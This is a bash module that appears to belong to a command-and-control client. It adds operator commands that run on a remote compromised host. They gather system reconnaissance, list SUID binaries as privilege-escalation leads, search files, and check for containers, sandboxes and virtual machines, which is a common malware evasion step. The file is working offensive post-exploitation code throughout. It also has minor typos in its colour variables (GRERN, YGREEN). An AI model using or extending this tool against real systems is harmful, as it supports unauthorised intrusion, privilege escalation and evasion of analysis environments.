#!/usr/bin/env bash
#c2-client module
#YbBKCESADB
#system

source funcmgr.sh
YbBKCESADB_main() {
	:
}

YbBKCESADB_init() {
	register_function "explore" "explore" 0 "Target system basic info"
	register_function 'suid' "find_suid" 0 "Find SUID binaries"
	register_function "search" "find_files" 2 "Find files by regex"
	register_function "detect_sandbox" "detect_sandbox" 0 "Detect and determine sandbox type"
}

YbBKCESADB_description() {
	echo "System tools module"
}

YbBKCESADB_help() {
	echo -e "${BLUE}explore${NC} show basic system info"
	echo -e "${BLUE}suid${NC} find SUID binaries"
	echo -e "${BLUE}search${NC} search for files. Usage: search <regex> <dir>"
	echo -e "${BLUE}detect_sandbox${NC} detect and determine sandbox type"
}

explore() {
	echo -e "${GREEN}[*] ${YELLOW}System reconnaissance${NC}:"

	# helper for printing multiline remote output with indentation
	_print_block() {
		local title="$1"
		local data="$2"
		echo -e "${GREEN}[+]${NC} ${YELLOW}${title}:${NC}"
		if [[ -z "$data" ]]; then
			echo -e "    ${RED}(no output)${NC}"
		else
			# prefix each line with 4 spaces for readability
			while IFS= read -r _line; do
				printf '    %s\n' "$_line"
			done <<<"$data"
		fi
		echo
	}

	local out

	out=$(send_cmd "uname -a" 2>/dev/null || true)
	_print_block "Kernel / OS" "$out"

	out=$(send_cmd "cat /etc/issue 2>/dev/null || true" 2>/dev/null || true)
	_print_block "/etc/issue" "$out"

	out=$(send_cmd "hostname 2>/dev/null || true" 2>/dev/null || true)
	_print_block "Hostname" "$out"

	out=$(send_cmd "mount | sed -n '1,40p' 2>/dev/null || true" 2>/dev/null || true)
	_print_block "Mounts (first 40 lines)" "$out"

	out=$(send_cmd "ps aux --sort=-%mem 2>/dev/null | head -n 15 || true" 2>/dev/null || true)
	_print_block "Top processes (by memory)" "$out"

}

detect_sandbox() {
	echo -e "${GREEN}[*] ${YELLOW}Checking for sandbox or VM environment on remote system...${NC}"
	local DETECTED=0

	# 1. Docker / LXC / Kubernetes detection via cgroup
	if send_cmd "grep -qE 'docker|lxc|kubepods' /proc/1/cgroup && echo yes || echo no" | grep -q yes; then
		echo -e "${GREEN}[!] ${YELLOW}Detected containerized environment (Docker/LXC/Kubernetes)${NC}"
		DETECTED=1
	fi

	# 2. Bubblewrap detection via mount
	if send_cmd "mount | grep -q '/bubblewrap' && echo yes || echo no" | grep -q yes; then
		echo -e "${GREEN}[!] ${YELLOW}Detected Bubblewrap sandbox${NC}"
		DETECTED=1
	fi

	# 3. VM detection via DMI
	local PN
	PN=$(send_cmd "cat /sys/class/dmi/id/product_name 2>/dev/null || echo unknown")
	case "$PN" in
	*VirtualBox*)
		echo -e "${GREEN}[!] ${YELLOW}Detected VirtualBox VM${NC}"
		DETECTED=1
		;;
	*VMware*)
		echo -e "${GREEN}[!] ${YELLOW}Detected VMware VM${NC}"
		DETECTED=1
		;;
	*KVM*)
		echo -e "${GREEN}[!] ${YELLOW}Detected KVM/QEMU VM${NC}"
		DETECTED=1
		;;
	*Bochs*)
		echo -e "${GREEN}[!] ${YELLOW}Detected Bochs VM${NC}"
		DETECTED=1
		;;
	*Microsoft*Virtual*)
		echo -e "${GREEN}[!] ${YELLOW}Detected Hyper-V VM${NC}"
		DETECTED=1
		;;
	esac

	# 4. Hypervisor flag in CPU info
	if send_cmd "grep -q 'hypervisor' /proc/cpuinfo && echo yes || echo no" | grep -q yes; then
		echo -e "${GREEN}[!] ${YELLOW}Hypervisor flag detected in CPU info${NC}"
		DETECTED=1
	fi

	# 5. systemd-nspawn container check
	if send_cmd "grep -q 'systemd-nspawn' /proc/1/cmdline && echo yes || echo no" | grep -q yes; then
		echo -e "${GRERN}[!] ${YELLOW}Detected systemd-nspawn container${NC}"
		DETECTED=1
	fi

	# 6. Container-specific devices
	if send_cmd "[ -d /dev/.lxc ] && echo yes || [ -d /dev/.dockerinit ] && echo yes || echo no" | grep -q yes; then
		echo -e "${YGREEN}[!] ${YELLOW}Detected container-specific devices (/dev/.lxc or /dev/.dockerinit)${NC}"
		DETECTED=1
	fi

	if [[ "$DETECTED" -eq 0 ]]; then
		echo -e "${GREEN}[+] ${YELLOW}No sandbox or VM detected on remote system.${NC}"
	fi
}

find_files() {
	local PATTERN="$1"
	local DIR="${2:-/}"
	echo -e "${GREEN}[*] ${YELLOW}Finding files: $PATTERN in $DIR${NC}"
	send_cmd "find $DIR -name '$PATTERN' -type f 2>/dev/null"
}

find_suid() {
	echo -e "${GREEN}[*] ${YELLOW}Finding suid binaries${NC}"
	send_cmd "find / -perm /4000 2>/dev/null"
}
